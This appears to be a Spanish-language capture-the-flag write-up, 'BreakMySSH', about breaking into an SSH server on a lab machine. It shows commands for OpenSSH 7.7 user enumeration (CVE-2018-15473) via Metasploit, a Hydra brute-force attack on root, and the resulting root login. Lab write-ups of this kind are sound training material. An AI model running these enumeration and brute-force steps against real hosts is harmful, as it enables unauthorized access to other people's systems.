# BreakMySSH
## 1. Reconocimiento Inicial con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultado:**

*   `22/tcp open ssh OpenSSH 7.7 (protocol 2.0)`: La versión 7.7 es antigua y susceptible a ciertas vulnerabilidades de enumeración.

## 2. Enumeración de Usuarios SSH

La versión de OpenSSH (7.7) es conocida por ser vulnerable a la enumeración de usuarios (CVE-2018-15473). Esta vulnerabilidad permite a un atacante verificar la existencia de usuarios válidos en el sistema midiendo diferencias sutiles en las respuestas del servidor durante la autenticación.

### 2.1. Búsqueda de Exploits con Searchsploit

Utilizamos `searchsploit` para buscar exploits públicos.

```bash
searchsploit OpenSSH 7.7
```

**Resultados**

```bash
Exploit Title                                   |  Path
------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration        | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)  | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)            | linux/remote/45939.py
------------------------------------------------ ---------------------------------
```

### 2.2. Enumeración con Metasploit

Para explotar este fallo de diseño y validar usuarios, utilizamos el módulo auxiliar de Metasploit `scanner/ssh/ssh_enumusers`

```bash
sudo msfdb init && msfconsole -q
```

Dentro de la consola de Metasploit:

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <IP_DEL_OBJETIVO>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set THREADS 5
run
```

**Análisis de Resultados:**

El escáner confirma la existencia de varios usuarios del sistema (`backup`, `bin`, `daemon`) y, crucialmente, valida que el usuario **`root`** está habilitado para intentos de conexión.

## 3. Ataque de Fuerza Bruta SSH

Una vez que tenemos una lista de usuarios válidos, podemos intentar un ataque de fuerza bruta para adivinar sus contraseñas. Nos enfocaremos en el usuario `root`.

### 3.1. Fuerza Bruta con Hydra

Confirmada la existencia del usuario `root`, procedemos a realizar un ataque de fuerza bruta para obtener su credencial, asumiendo que la configuración del servidor permite el login con contraseña para el superusuario.

```bash
hydra -l root -P /path/to/wordlist/passwords.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado:**

*   `[22][ssh] host: <IP_DEL_OBJETIVO> login: root password: estrella`

Hemos obtenido credenciales válidas:

- **Usuario:** `root`
- **Contraseña:** `estrella`

## 4. Acceso SSH y Manejo de Claves de Host

Con las credenciales en mano, procedemos a iniciar sesión.

### 4.1. Gestión de Claves de Host (Known Hosts)

```bash
ssh root@<IP_DEL_OBJETIVO>
```

**Error Común:**

Es posible que aparezca un mensaje de advertencia como "`WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`". Esto ocurre si la clave de host del servidor ha cambiado desde la última vez que nos conectamos a esa IP. Para resolverlo, debemos eliminar la entrada antigua de la clave de host de nuestro archivo `known_hosts`.

```bash
ssh-keygen -f "/home/user/.ssh/known_hosts" -R "<IP_DEL_OBJETIVO>"
```

Después de eliminar la entrada, intentamos la conexión SSH nuevamente.

### 4.2. Conexión y Verificación

Finalmente, establecemos la conexión SSH:

```Bash
ssh root@<IP_DEL_OBJETIVO>
# Password: estrella
```

Verificamos nuestra identidad en el sistema:

```Bash
whoami
# root
```
